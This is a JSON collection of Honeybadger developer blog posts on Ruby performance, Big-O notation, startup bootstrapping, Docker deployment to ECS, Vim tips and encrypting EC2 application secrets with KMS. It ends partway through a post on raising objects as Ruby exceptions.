{"website": "Honey-Badger", "title": "How OpenStruct Can Kill Performance", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-openstruct-and-hashes-can-kill-performance/", "abstract": "We Rubyists love our hashes.  But hashes have a few well known flaws. As Richard pointed out in Hashie Considered Harmful , they can be TOO flexible at times - a quick typo and you can assign and reference keys that you never intended. a = { type: \"F150\" } a [ :typo ] # nil Some Common Hash Alternatives If you're using hashes to store actual structured data, you may decide that you don't really need flexibility. That it's only going to get you into trouble. There are a few alternatives. Imagine that you need to store a pair of XY coordinates. One approach might be to define a class, whose only job is to hold a pair of XY coordinates. class PointClass # I don't recommend ending class names with Class :) attr_accessor :x , :y def initialize ( args ) @x = args . fetch ( :x ) @y = args . fetch ( :y ) end end point_class = PointClass . new ( x: 1 , y: 2 ) point_class . x # 1 Since in this case we only need to encapsulate data, a more concise choice might be to use a Struct . Here's what that looks like: PointStruct = Struct . new ( :x , :y ) point_struct = PointStruct . new ( 1 , 2 ) point_struct . x # 1 A third option might be to use OpenStruct . OpenStruct looks kind of like a struct, but lets you set arbitrary values like a hash. Here's an example: point_os = OpenStruct . new ( x: 1 , y: 2 ) point_os . x # 1 Performance Implications [UPDATE 7/10/2015: It appears that my benchmarking script was unfair to hashes. As Patrick Helm pointed out, I was using an inefficient method of initializing them. So please disregard the results for hashes. Though my main point about openstruct being super slow is still valid. You can see his changes to my benchmark script here ] Looking at these four options, I began to wonder what the performance implications were. It's pretty obvious that any of these options is fast enough if you're only dealing with a little bit of data. But if you have thousands or millions of items to process, then the performance impact of a hash vs OpenStruct vs struct vs class could begin to matter. At Honeybadger, we have thousands of exceptions being reported to our API each second, so understanding performance implications like this is always on our minds. So, I wrote a simple benchmark script. I like to use the benchmark-ips gem for experiments like this because it automatically figures out a good sample size, and reports standard deviation. Initialization When I benchmarked initialization times for PointClass, PointStruct, Hash, and OpenStruct I found that PointClass and PointStruct were the clear winners. They were about 10x faster than OpenStruct, and about 2x faster than the hash. PointClass and PointStruct were nearly 10x faster than OpenStruct These results make sense. Structs are the simplest, so they're fastest. OpenStruct is the most complex (it's a wrapper for Hash) so it's the slowest. However the magnitude of the difference in speed is kind of surprising. After running this experiment, I'd be really hesitant to use OpenStruct in any code where speed is a concern. And I'll be casting a wary eye at any hashes that I see in performance-critical code. Read / Write Unlike initialization, all four options are roughly the same when it comes to setting and accessing values. Reading and writing benchmarks show no huge difference between Struct, class, hash and OpenStruct The Benchmarking Script If you'd like to run the benchmark on your own system, you can use the script below. I ran it on MRI 2.1 on OSX. If you're curious about performance on other ruby interpreters, Michael Cohen has created an awesome gist with results for MRI 2.2, JRuby and others . require 'benchmark/ips' require 'ostruct' data = { x: 100 , y: 200 } PointStruct = Struct . new ( :x , :y ) class PointClass attr_accessor :x , :y def initialize ( args ) @x = args . fetch ( :x ) @y = args . fetch ( :y ) end end puts \" \\n\\n INITIALIZATION ==========\" Benchmark . ips do | x | x . report ( \"PointStruct\" ) { PointStruct . new ( 100 , 200 ) } x . report ( \"PointClass\" ) { PointClass . new ( data ) } x . report ( \"Hash\" ) { Hash . new . merge ( data ) } x . report ( \"OpenStruct\" ) { OpenStruct . new ( data ) } end puts \" \\n\\n READ ==========\" point_struct = PointStruct . new ( 100 , 200 ) point_class = PointClass . new ( data ) point_hash = Hash . new . merge ( data ) point_open_struct = OpenStruct . new ( data ) Benchmark . ips do | x | x . report ( \"PointStruct\" ) { point_struct . x } x . report ( \"PointClass\" ) { point_class . x } x . report ( \"Hash\" ) { point_hash . fetch ( :x ) } x . report ( \"OpenStruct\" ) { point_open_struct . x } end puts \" \\n\\n WRITE ==========\" Benchmark . ips do | x | x . report ( \"PointStruct\" ) { point_struct . x = 1 } x . report ( \"PointClass\" ) { point_class . x = 1 } x . report ( \"Hash\" ) { point_hash [ :x ] = 1 } x . report ( \"OpenStruct\" ) { point_open_struct . x = 1 } end", "date": "2015-06-23"},
{"website": "Honey-Badger", "title": "Exploring Big-O Notation With Ruby", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/big-o-notation-ruby/", "abstract": "There once was a time when nothing scared me more than hearing the question, \"What's the Big-O notation for that?\" I remembered the topic from school, but because it had to do with math (which was never my strongest subject), I had blacked it out. However, as my career progressed, I found myself: Looking at performance charts Trying to debug slow queries Being asked if I had considered how my code would hold up given increased load When I decided it was time to circle back (get it?) to learn Big-O, I was surprised at its high-level simplicity. I'm sharing what I learned in this article so that you, my fellow engineers, can not only pass interviews with flying colors, but also build performant, scalable systems. I promise, Big-O isn't as scary as it seems. Once you get it down, you can look at an algorithm and easily discern its efficiency, without having to run a profiling tool! What is Big-O notation? Big-O notation is a fancy way to say, \"Hey, what's the worst case performance for this algorithm?\" You might have seen a function described as O(n) or O(1). This means: O(n) - Worst-case run time increases linearily as the input size (n) increases O(1) - Worst-case run time is constant for any size input ...and to really understand what this means, we need to learn about asymptotes Asymptotes? Let's travel back to high school algebra, dust off our textbook and open it to the chapters on limits and asymptotes. Limit analysis: seeing what happens to a function as it approaches some value Asymptotic analysis: seeing what happens as f(x) approaches infinity For example, let's say we plot the function f(x) = x^2 + 4x. We can perform the following analyses:\n- Limit analysis: As x increases, f(x) approaches infinity, so we can say that the limit of f(x) = x^2 + 4x as x approaches infinity is infinity. \n- Asymptotic analysis: As x becomes very large, the 4x term becomes insignificant compared to the x^2 term. So we can say that f(x) = x^2 + 4x becomes almost equivalent to f(x) = x^2 for values of x approaching infinity. To understand how we can say that part of a function becomes \"insignificant,\" consider what happens when you plug different numbers into the original function. For example, when x = 1, the function returns 1 + 4 (which equals 5). However, when x = 2,000, the function returns 4,000,000 + 8,000 (which equals 4,008,000) -- the x^2 term is contributing much more to the total than the 4x. Big-O notation is one way of describing how an algorithm's run time changes as the size of the input changes. What determines the run time of an algorithm? If I ask you how long it will take you to find a needle in a haystack, I imagine you will want to know how much hay is in the stack. If I respond \"10 pieces\" I bet you will be pretty confident you can find the needle within a minute or two, but if I say \"1,000 pieces,\" you probably won't be as excited. There's one other piece of information you should know. How much longer does it take to search the stack for each piece of hay added? And what happens as the amount of hay approaches infinity? This is very similar to the example of asymptotic analysis above.  Let's look at one more example just to make sure we've all got this down. Consider the function f(x) = 5x^2 + 100x + 50. We can plot the two parts of this function separately: Just like the previous example, the 5x^2 term eventually becomes larger than the 100x + 50 terms, so we can drop them and say that the runtime of f(x) = 5x^2 + 100x + 50 grows as x^2. Of course, it's worth mentioning that there are other factors affecting run time, such as the speed of the actual computer running the program, and the language used. Finding the Big-O for linear search Let's do a Big-O analysis of the linear search algorithm. A linear search starts at the beginning of a dataset and traverses until the target element is found. Here is an implementation in Ruby. def find_number_via_linear_search ( array , target ) counter = 0 # iterate through the given array starting # at index 0 and continuing until the end while counter < array . length if array [ counter ] == target # exit if target element found return \"linear search took: #{ counter } iterations\" else counter += 1 end end return \" #{ target } not found\" end We could give this method a spin like this: # Let's create an array with 50 integers # and then re-arrange the order to make # things more interesting array = [ * 1 .. 50 ]. shuffle find_number_via_linear_search ( array , 24 ) I ran this a few times and got the following results: => \"linear search took: 10 iterations\"\n=> \"linear search took: 11 iterations\"\n=> \"linear search took: 26 iterations\" When analyzing the Big-O notation of a function, we care about the worst-case scenerio (a.k.a. the upper asymptotic bound). Thinking about this intuitively, the smallest number of iterations would be 1.  That occurrs when the target element was in position 0 in the array.  The largest number of iterations (or worst-case scenerio) would be 50. This will happen when the target element was not found in the array. If our array has 100 elements, the worst-case will be 100 iterations. 200 elements? 200 iterations. Thus, the Big-O notation for linear search is simply O(n), where n is the number of elements. A more complex example with binary search! Let's consider binary search next. Here's how you do a binary search of a pre-sorted array:\n1. Take the middle element 2. If element == target we're done\n3. If element > target discard the top half of the array \n4. If element < target discard the bottom half of the array \n5. Start over at step 1 with the remaining array Note: If you're a Rubyist, there is a built-in b-search method that implements this algorithm for you! For example, let's say that you have a dictionary and you're looking for the world \"pineapple.\" We'd go to the middle page of the dictionary. If it happened to have the world \"pineapple,\" we'd be done! But my guess is, the middle of the dictionary wouldn't be in the \"p's\" yet so maybe we'd find the word \"llama.\" The letter \"L\" comes before \"P\" so we would discard the entire lower half of the dictionary. Next, we'd repeat the process with what remained. As with linear search, the best-case run time for a binary search is one iteration. But what's the worst case? Here is an example array that has 16 elements -- let's pretend that we want to use a binary search to find the number 23: [2, 3, 15, 18, 22, 23, 24, 50, 65, 66, 88, 90, 92, 95, 100, 200] The first step would be to look at the number at index 7, which is 50. Since 50 is greater than 23, we discard everything to the right. Now our array looks like this: [2, 3, 15, 18, 22, 23, 24, 50] The middle element is now 18, which is less than 23, so we discard the lower half this time. [22, 23, 24, 50] Which becomes [22, 23] Which finally becomes [23] In total, we had to divide the array in half 4 times in order to find the number we were targeting in the array, which had a length of 16. To generalize this, we can say that the worst case scenerio for binary search is equal to the maximum number of times we can divide the array in half. In math, we use logarithms to answer the question, \"How many of this number do we multiply to get that number?\" Here's how we apply logarithms to our problem: We can thus say that the Big-O, or worst-case run time for a binary search, is log(base 2) n. Wrapping up Big-O notation is a fancy way to say, \"Hey, what's the worst case for this?\" Putting computer science aside, a real-world example could be what happens when you ask your plumber how much it will cost to repair the broken faucet. He might respond, \"Well, I can guarantee it won't be more than $2,000.\" This is an upper bound, although not very helpful to you. Because of this, other Big-O notations are often utilized. For example, Big-Theta cares about both the lower bound and upper bound. In this case, the plumber would respond, \"Well, it won't be less than $1,000 but it won't be more than $2,000.\" This is much more useful. Thank you for reading, and I hope that this post helped make Big-O notation at least a slightly less scary topic!", "date": "2020-02-04"},
{"website": "Honey-Badger", "title": "What Ruby Conferences Can Teach Us About Leadership", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/what-ruby-conferences-can-teach-us-about-leadership/", "abstract": "Why aren't Ruby conferences talking about Ruby anymore? Our recent sponsorship of Rocky Mountain Ruby 2016 showcases the growing diversity of the community. The person we sent to the conference is not a developer by trade - and for a second I was worried about the technical content of the talks. But after watching them, it's evident even the most experienced Rubyists are emphasizing non-technical skills to succeed in the workplace. If you're a developer lamenting this shift, the following talks may not be what you had in mind. But if you're looking to move into leadership opportunities, there are some valuable points to take away. Notable Themes Include: 1. Mentorship. There's no better way to test your expertise than to teach someone else. Kinsey Ann Durham and Kim Barnes showcase their mentor/mentee relationship on stage and prove mentorship helps junior developers become more confident programmers, as well as helps senior developers sharpen their skills and gain a new perspective. 2. Communication. Sarah Allen is a legend in many respects but lately has been on a mission to educate community members about technology. By sharing stories of her work at BridgeFoundry, she argues technical skills only become stronger when they can be communicated and shared with others - especially those coming from a diverse background. 3. Building a system. The most unlikely Microsoft employee ever (His words, not ours), Chad Fowler was a pillar in the Colorado tech community for years before joining Wunderlist/Microsoft. He shares his story about rewriting his legacy code and reminds us what thought leadership is all about with his concept of \"immutable infrastructure.\" Conclusion While there is an amount of technical aptitude required to take on a challenge (like rewriting your codebase), these talks demonstrate the other aspects needed for success - communication with your team as well as the mentorship of junior staff. Rocky Mountain Ruby 2016 serves to remind developers of other skills needed beyond programming to become stronger technical leaders. Curious about the rest of the conference talks? Watch the full lineup at Confreaks .", "date": "2016-11-21"},
{"website": "Honey-Badger", "title": "What You Need to Know About Bootstrapping", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/what-you-need-to-know-about-bootstrapping/", "abstract": "A great product idea always starts with pain. At first, the pain is annoying. Maybe you severely dislike a tool's functionality. Or you keep building the same process over and over. Then one day, the pain is intolerable. You want to create the solution that will make it go away for good. Congratulations, you are now an entrepreneur. Except you have to figure out how to make time to build your product idea...and fund it. We Bootstrapped Our Business. But There Are Disadvantages We at Honeybadger went through the same process and opted to bootstrap our business. While we are grateful we own our company outright, it's not an easy road. Here's a breakdown of three situations you might run into if you're thinking about self-funding your product idea...and how to overcome them. 1. Bootstrapping slows down your product development cycle You can start building your product. But you're still balancing your day job to support your lifestyle. As a result, you're overextended and won't be able to give it up until you have your first customer. How to make it work If it becomes difficult to keep your day job, build a consulting practice. You generate extra income and have the flexibility to create your product in your off-hours. Think of it as an insurance policy in case your product idea doesn't take off. FYI: Starr, Ben, and Josh were consultants by trade before starting Honeybadger, so talk to them about how they balanced their work. They might even make introductions to some potential clients if you ask nicely ;). 2. Bootstrapping forces you to hire slowly At some point, you may decide you need some extra help. But you have to figure out who is willing to pitch in, for the right price. If not money, are you willing to give up ownership of your company? How to make it work Use contractors for short-term projects with specific deliverables. As for long-term product vision, talk to people you've worked with at previous jobs. If they're not the right fit, they might know someone who could be. Hiring is hard to get right, so don't rush the process. Honeybadger was fortunate to have three co-founders from the beginning. It gave them many years of success before they felt the need to bring on their first hire (Me!). 3. Bootstrapping makes you work multiple jobs. So you went out and made some hires! But you're drowning in extra duties as assigned: legal, customer support rep, sales, accounting. Product development is still slow, despite having extra help. How to make it work Delegate. Decide who will work on what. Make sure to establish standards on how each person receives feedback about their work. If it makes sense, share one or two duties amongst all. At Honeybadger, the guys split up development duties but share customer support. Have you ever submitted a support ticket to us? Chances are the person responding is the one who built the infrastructure in question. It's a good day when they can deploy a fix within an hour if need be. #bootstrapgoals #nottheframework Are you ready to take the plunge? Terrified to get started? Don't be. Successful products take time and a lot of iterations to get right, whether you bootstrap or not. Take a deep breath, start building, and show the world what you got. Want to see more articles like this? Let me know at sophia@honeybadger.io!", "date": "2016-09-07"},
{"website": "Honey-Badger", "title": "Announcing OpsGenie Integration", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/announcing-opsgenie-integration/", "abstract": "We are super excited to announce that Honeybadger and OpsGenie now work together. OpsGenie delivers alerts with all the supporting information to the right people, enabling them to assess the incident and take appropriate actions rapidly. With this integration, you can route all of your Honeybadger notifications to OpsGenie, which then delivers alerts to your team based on your current on-call schedule. The good folks at OpsGenie have put together a detailed guide about how you can get started . To learn about which events you can send, as well as advanced topics such as throttling and filters, check out our documentation .", "date": "2015-12-21"},
{"website": "Honey-Badger", "title": "Level-up `rescue` with dynamic exception matchers", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/level-up-ruby-rescue-with-dynamic-exception-matchers/", "abstract": "When you use a rescue clause in Ruby, you can specify what kinds of exceptions you want to rescue. All you need to do is provide a list of exception classes like so: begin raise RuntimeError rescue RuntimeError , NoMethodError puts \"rescued!\" end But what if you don't know what the exception class will be at the time that you write the code? The most obvious answer is to rescue all exceptions, perform some kind of test and then re-raise the exceptions that don't pass. Something like this: begin raise \"FUBAR! The ship's going down!\" rescue => e raise unless e . message =~ /^FUBAR/ ... do something ... end But that's so boring! Plus, it's not a very DRY approach. It would be a lot more interesting if we could somehow tell the rescue clause to only rescue exceptions matching our conditions. And since this is Ruby, we can do it! How rescue matches exceptions When an exception happens inside of a rescue block, the ruby interpreter checks the exception's class against the list of exception classes you provided. If there's a match, the exception gets rescued. The matching looks something like this: exception_classes_to_rescue . any? do | c | c === raised_exception . class end Just like every other operator in Ruby, === is simply a method. In this case it's a method of c . So what could we do if we defined our own === method? In the example below I'm creating a class named Anything where Anything === x returns  true for any value of x. If I give this class as an argument to rescue, it causes all exceptions to be rescued. class Anything def self . === ( exception ) true end end begin raise EOFError rescue Anything puts \"It rescues ANYTHING!\" end While there are much better ways to rescue all exceptions, this code is interesting because it shows us two things: You can give the rescue clause classes that don't inherit from Exception , as long as they implement === If you control === , you can control which exceptions are rescued. Rescuing exceptions based on message Knowing what we know now, it's simple to write code that only rescues exceptions if the exception's message matches a pattern. class AllFoobarErrors def self . === ( exception ) # rescue all exceptions with messages starting with FOOBAR exception . message =~ /^FOOBAR/ end end begin raise EOFError , \"FOOBAR: there was an eof!\" rescue AllFoobarErrors puts \"rescued!\" end Rescuing exceptions based on custom attributes Since you have access to the exception object, your matcher can use any data contained inside that object. Imagine for a moment that you have an exception that has a custom attribute called \"severity.\" You'd like to swallow all \"low severity\" occurrences of the exception, but let pass any \"high severity\" occurrences. You might implement that like so: class Infraction < StandardError attr_reader :severity def initialize ( severity ) @severity = severity end end class LowSeverityInfractions def self . === ( exception ) exception . is_a? ( Infraction ) && exception . severity == :low end end begin raise Infraction . new ( :low ) rescue LowSeverityInfractions puts \"rescued!\" end Making it dynamic All of this is pretty cool, but it does involve a lot of boilerplate code. It seems excessive to have to manually define separate classes for each matcher. Fortunately we can DRY this up quite a bit by using a little metaprogramming. In the example below, we're defining a method that generates matcher classes for us. You provide the matching logic via a block, and the matching generator creates a new class that uses the block inside of its === method. def exceptions_matching ( & block ) Class . new do def self . === ( other ) @block . call ( other ) end end . tap do | c | c . instance_variable_set ( :@block , block ) end end begin raise \"FOOBAR: We're all doomed!\" rescue exceptions_matching { | e | e . message =~ /^FOOBAR/ } puts \"rescued!\" end A grain of salt Like many cool tricks in Ruby, I can't quite decide if all of this is insanity or a great idea. Maybe it's a little of both. While I definitely wouldn't suggest that you reach for this technique as a first choice, I can see how it would be useful in situations like the one above where you want to rescue exceptions based on severity. In any case, it's another tool in your toolbelt!", "date": "2015-07-13"},
{"website": "Honey-Badger", "title": "How to Deploy a Sinatra App in Docker to Amazon's EC2 Container Service", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-deploy-a-sinatra-app-in-docker-to-amazon-s-ec2-container-service/", "abstract": "Confession time. My development environment hasn't changed much in the four years I've worked on Honeybadger. But in that time Honeybadger has become a lot more sophisticated, depending on around ten services to function. That's why we've been moving towards Docker for local development.  Instead of every developer having to set up Postgres, Cassandra, Memcached and the rest, we can use docker-compose to spin up a pre-made environment. It's awesome. Naturally, I started to wonder how easy it would be to deploy a Dockerized application. Deploying With Docker Docker comes with utilities like docker-machine and docker-swarm which are supposed to make deployment painless. So far they haven't delivered on that promise. If you'd like to read all about their deficiencies, check out this recent hacker news post . That's why I chose to focus on Amazon's ECS (EC2 Container Service). What's ECS? ECS is kind of like a grown-up, production-ready mashup of docker-compose and docker-swarm. With ECS you can say \"Run three copies of my web app\" and it will intelligently spin up the appropriate Docker containers inside your cluster of EC2 instances. It can load-balance requests across your containers, and can scale your cluster up or down depending on load. Creating a Dockerized Sinatra App Here's a simple Sinatra app. It prints the current time, so you'll know if you see a cached version. It also prints the name of the computer running the app. Later on, we're going to be spinning up multiple servers running this app and using a load balancer to route requests. By returning the hostname, we can tell which server served a particular request. The App The Dockerized Sinatra app I'm about to show you is a heavily rewritten version of tcnksm-sample/docker-sinatra . require 'sinatra' require 'sinatra/base' class App < Sinatra :: Base get '/' do \"Hello from sinatra! The time is #{ Time . now . to_i } on #{ `hostname` } !\" end end Here's the Gemfile : # Gemfile source 'https://rubygems.org' gem 'sinatra' gem 'thin' ...and here's the config.ru file: $: . unshift ( File . dirname ( __FILE__ )) require 'app' run App The Dockerfile We'll need a Dockerfile to create a Docker image for this app. It creates the directory for the app, copies the files over, and runs a web server on port 80. FROM ruby:2.3.1-slim\nRUN apt-get update -qq && apt-get install -y build-essential\n\nENV APP_ROOT /var/www/docker-sinatra\nRUN mkdir -p $APP_ROOT\nWORKDIR $APP_ROOT\nADD Gemfile* $APP_ROOT/\nRUN bundle install\nADD . $APP_ROOT\n\nEXPOSE 80\nCMD [\"bundle\", \"exec\", \"rackup\", \"config.ru\", \"-p\", \"80\", \"-s\", \"thin\", \"-o\", \"0.0.0.0\"] Building and Running the Image First, we're going to tell Docker to build an image out of the Docker file in the current directory. Then we'll run it, mapping the container's port 80 to localhost:4000. docker build -t docker-sinatra .\ndocker run -p 4000:80 docker-sinatra To check if it worked, open up localhost:4000 in your web browser. You should see something like this: Deploying to ECS Now let's deploy to ECS. We're going to use their setup wizard. Is that cheating? I don't care. :) So head over to the ECS control panel. Click \"Get Started.\" Then click \"Continue\" on the next screen.\" Creating your Docker registry You typically don't upload Docker images to a production server from your development environment. Instead, you send the images to a Docker registry -- like dockerhub -- and the server pulls them on deploy. Amazon provides a private Docker registry. It's not a requirement that you use it, but we're going to for now. I'll name my registry \"docker-sinatra\": Pushing your Image to the Registry Then, I'm given a list of commands to run to build my image and push it to the registry. The first time I tried this, my browser's ad-blocker prevented the commands from being displayed correctly. Weird - I know. Creating your Task Definition AWS loves making up new, confusing, terminology. A \"task definition\" is simply a list of containers that should run together. It's kind of like a Procfile, or a docker-compose configuration. So, if your application has one container running Nginx, one running Unicorn, and one running Sidekiq then all three might be contained within your \"task definition.\" Our app is much simpler. We only have one container. So the configuration is minimal. I'll make sure the correct image pulls from our registry I'll map port 80 from the container to port 80 on the EC2 instance running the container. Creating your Service More confusing terminology! The \"service\" configuration lets you specify how many \"tasks\" (a.k.a. copies of your app) should run, and how they're load balanced. Here, I want three copies of my app to run, with load balancing on port 80. Spinning up your Cluster A cluster is a bunch of typical EC2 instances that are running Amazon's ECS software. You can do anything with them you could do with any other EC2 instance. In this case, I specified I wanted three t2.micro instances. After a few confirmation steps and a wait of about 5 minutes, everything was ready. Once your service is functional, you'll see a screen that looks something like this: Testing the app You can click on the load balancer name to pull up its details. There, you should find its public domain name. Put that in your browser and you'll see our sample app. If you refresh a few times, you'll see that the hostname changes. That's because the load balancer is balancing your requests across all three hosts. Cleaning up The ECS wizard created a lot of resources in your AWS account just now. You probably don't want to leave them there. They'll clutter things up, and may cost you money. Fortunately, the ECS wizard uses CloudFormation to create all of its resources. That means you can delete everything simply by removing the CloudFormation stack.", "date": "2016-09-13"},
{"website": "Honey-Badger", "title": "Vim tips that will change your life", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/vim-tips-that-will-change-your-life/", "abstract": "Vim is objectively the best code editor there is. [Editor's note: Opinions are those of the author. Honeybadger remains neutral in the vim/emacs/sublime holy war] No matter how much you know about Vim, there's still more to learn. Here are a few features it took me far too long to discover, that I will now aggresively sell to you. Ctrl+C Vim users! Are you tired of reaching all the way up to the ESC key to leave insert mode?! THERE'S GOT TO BE A BETTER WAY! Starting now, you can use Ctrl+C to exit insert mode anytime you want! But wait! There's more! Using Ctrl+C requires no extra configuration ! It comes out of the box with Vim! :x Are you a two-keystroke slave ? Kill two birds with one stone and save yourself THOUSANDS of nanoseconds over the course of your life by using :x instead of :wq when saving and quitting! That's right, :x is the exact equivalent of :wq . Put that in your pipe and smoke it (not literally). Vundle Are you still installing plugins the old-fashioned way? With Vundle , you can install any Vim plugin in just seconds by adding a simple configuration directive! Want to try vim-rails ? No problem. Does FuzzyFinder look interesting to you? Throw it on the pile! With Vundle, the world is your oyster! Jumping among blank lines Using j and k to move among lines can feel at times like jogging through waist-deep water. Why not take the express lane? Pressing { and } will allow you to move upward and downward, respectively, from blank line to blank line. Cleaning up improperly indented code Let's face it, your co-workers are idiots . The success of your employer rests squarely on your shoulders and you don't have all day to spend fixing the poorly structured code written by the protohumans with whom you're forced to collaborate. Using the magic wand of = in Vim, you can select any block of text ( Shift+V then up/down), hit the = key, and presto! Your code will be beautifully indented before you can say \"passive aggression\"!", "date": "2014-01-22"},
{"website": "Honey-Badger", "title": "How to Manage Application Secrets in EC2", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/managing-secrets-in-ec2/", "abstract": "When you deploy your application to EC2, it's a good idea to use\nautoscaling groups.  Autoscaling groups allow your application to scale up and down\nto meet demand, or to recover from failed instances, all without any\nmanual intervention.  To make them work, though, make sure\nthat every instance is fully ready to service live traffic after it\nfinishes booting.  That requires a bit more effort than just deploying\nyour app to a server, if you're used to making some changes on a new\nserver or doing an initial deployment via capistrano before it's ready to go. For example, we have a user-facing web application built using Rails.\nWhen it's done booting, each instance needs to have that Rails app\nready and waiting to respond to requests forwarded by the load balancer.\nTo make this happen, I first created a custom AMI by taking a snapshot\nof an instance provisioned via Ansible with the app,\nnginx, etc.  I then configured the autoscaling group with userdata that\ninvokes a script that copies what capistrano does for a\ndeployment — it pulls the latest code from git, runs bundler, and so on.\nSo with the app and all its dependencies in place, what's left? Application Secrets: The Deployer's Bane Application secrets present a challenge: you want to keep them from\nbeing stored where they can be exposed (like, say, in your git repo),\nbut you need them to be available to your app when it's running.  And due\nto autoscaling, you can't rely on a human to be there to put them in\nplace for your app when it needs them. One answer to this problem is Vault by Hashicorp.  It is a\nfantastic piece of software written specifically to solve this problem\nof keeping your secrets secret until your app needs them.  However, the\ndownside is that you have to provision and manage Vault — it's yet\nanother service that you need to keep running. Another option is to save the secrets in shared storage (S3, naturally),\nand ensure that only your instances have access to that bucket and/or\nkey.  This can be done using IAM roles , which can have policies\nadded to them that grant access to the restricted S3 resources.  That\nstill leaves you open to unwanted exposure, though, if you store all\nthose secrets in plaintext on S3.  It is possible to accidentally make\nthat data available to others with access to that bucket or even the\nwhole world. Wouldn't it be nice if you could encrypt your secrets before saving them\non S3, and then load and decrypt them in the app when you need\nthem? The Secret Ingredient: Amazon's Key Management Service Amazon's Key Management Service (KMS) provides an API for\ninteracting with encryption keys.  When combined with IAM roles and the Aws::S3::Encryption module, it only takes a few lines of code to\nload your secrets into your application while keeping them encrypted on\nS3. Before I dig in, I have to thank Don Mills, who wrote a fantastic post on using KMS plus S3 for storing secrets. I altered his approach\na bit by depending on IAM roles and keeping track of the KMS key id\nseparately rather than storing the key info along with the secrets on\nS3. KMS generates and provides access to a master encryption key that you\ncan use to encrypt and decrypt data.  When you ask it to encrypt something,\nKMS hands you a temporary key based on the master key, and that temporary\nkey can be used for encryption or decryption. To generate a key, you go to the IAM console and choose the\nEncryption Keys link.  When you create a key, you'll be asked to specify\nIAM users or roles that will have the ability to use this key. Select\nthe role that will be assigned to the EC2 instances that will be a part\nof the autoscaling group.  Note the ARN of key -- you'll be using that\nlater. Making the Roux: Equal parts KMS and IAM Once you've created the key, use the IAM console to edit the IAM role that you\nselected.  Grant access to the bucket where the secret will be stored by\nattaching a policy like this one: { \" Version \" : \" 2012-10-17 \" , \" Statement \" : [ { \" Sid \" : \" Stmt1476277816000 \" , \" Effect \" : \" Allow \" , \" Action \" : [ \" s3:GetObject \" , \" s3:PutObject \" , \" s3:PutObjectAcl \" , \" s3:HeadObject \" ], \" Resource \" : [ \" arn:aws:s3:::yourbucket/secrets.yml \" ] } ] } With the key configured and the policy attached to the role, you can\nnow interact with KMS and S3 via an Aws::S3::Encryption::Client instance.\nHere's some sample code that retrieves the secrets file and loads its\ncontents into environment variables: begin es3 = Aws :: S3 :: Encryption :: Client . new ( kms_key_id: ENV [ 'KMS_KEY_ID' ]) YAML . load ( es3 . get_object ( bucket: \"yourbucket\" , key: \"secrets.yml\" ). body . read ). each do | k , v | ENV [ k ] ||= v # Don't override local ENV settings end rescue ArgumentError # Raised when no KMS_KEY_ID was found in ENV, so there's nothing to do rescue Aws :: S3 :: Errors :: NoSuchKey # No secrets file was found, so there's nothing to do end First we instantiate a new object with the ID of the KMS key.  The ARN\nfor the key (displayed in the IAM console when you created the key) is\nstored in the KMS_KEY_ID environment variable. When you pass in the key\nID to the constructor here, it will handle the fetching of temporary\ndecryption keys for you.  You could specify an Aws::S3::Client instance\nas an option here, if you wanted to use a separate set of credentials to\ntalk to S3 than you are using to talk to KMS. If you set up the IAM role\nas before, though, you don't need to, as Aws::S3::Encryption::Client\nwill create a new Aws::S3::Client instance for you with the credentials\nprovided by the IAM role. With the encrypted S3 client ready, use #get_object to fetch the data\nfrom S3 and decrypt it using the key provided by KMS.  Once you have the\ndata, you can do what you want with it. Our data is YAML, so we load\nit and stuff the key/value pairs into ENV for the application code to\nuse. Drop this code into an initializer file in your Rails application, and\nyou are good to go.  Well, once you have your secrets stored on S3, that\nis. :)  Assuming you have an IRB console on an instance running with the\nright IAM role, you can do something like this to store your secrets: # Encrypt the data from /path/to/secrets.yml and store it on S3 Aws :: S3 :: Encryption :: Client . new ( kms_key_id: ENV [ 'KMS_KEY_ID' ]). put_object ( bucket: \"yourbucket\" , key: \"secrets.yml\" , body: File . read ( \"/path/to/secrets.yml\" )) Serve Immediately Now you have your secrets always available for any new instance that\ngets added to your autoscaling group while keeping the secrets\nencrypted. Everybody wins! :)", "date": "2016-10-17"},
{"website": "Honey-Badger", "title": "How to raise any object as a Ruby exception", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-raise-any-object-as-a-ruby-exception/", "abstract": "Ruby's raise syntax gives you a couple of options for specifying the kind of error you want raised. In the code below, I've shown three ways to raise a RuntimeError. raise \"hello\" raise RuntimeError , \"hello\" raise RuntimeError . new ( \"hello\" ) # ...all of the above result in \"RuntimeError: hello\" That's nice, but what happens when I want to raise something other than an exception? What if I wanted to raise a number? Well, Ruby won't let me. I'd get an error message like this: raise 1 # TypeError: exception class/object expected Now this message might lead you to believe that raise expects an exception class/object as a parameter. But that's incorrect! Introducing the exception method If you do raise foo the raise method doesn't expect foo to be an exception object. It expects that it will get an exception object whenever it calls foo.exception . The thing to remember is that you can pass ANYTHING to raise, just as long as it has a method called exception that returns an exception. So, if you wanted to, you could monkeypatch ruby's number classes to allow you to raise a number. Here's what that might look like: class Fixnum def exception RuntimeError . new ( \"I'm number: #{ self } \" ) end end raise 42 # ...results in raise_number.rb:7:in `<main>': I'm number: 42 (RuntimeError) This is a neat party trick, but could it ever be useful in real life? The main practical application I see for this technique is to separate the logic required to build an exception from the logic that decides to raise the exception. This is certainly a bit of an edge case. But let's see what that might look like. A possibly practical example Suppose I want to read a line of data from some kind of IO. It could be network IO, it could be a file. It doesn't really matter. I just want to read the data and see if it's valid. If the data I read isn't valid, I want to raise an exception. But the exception needs to be tailored to the input. A network connection needs to have different debug info than a local file. I can do that by providing custom exception methods for each kind of input class. Here's some pseudo-ruby showing what that might look like. # These three classes represent different kinds of IO with different exceptions. class NetworkConnection ... def exception NetworkConnectionError . new ( url: url , ... ) end end class LocalFile ... def exception FileError . new ( path: path , ... ) end end class UnixPipe ... def exception PipeError . new ( ... ) end end def read_all ( * items ) items . each do | item | if item . readline != \"foo\" # We raise the item, which causes the appropriate exception class to be used. raise item end end end read_all ( NetworkConnection . new ( url: \"example.com\" ), LocalFile . new ( 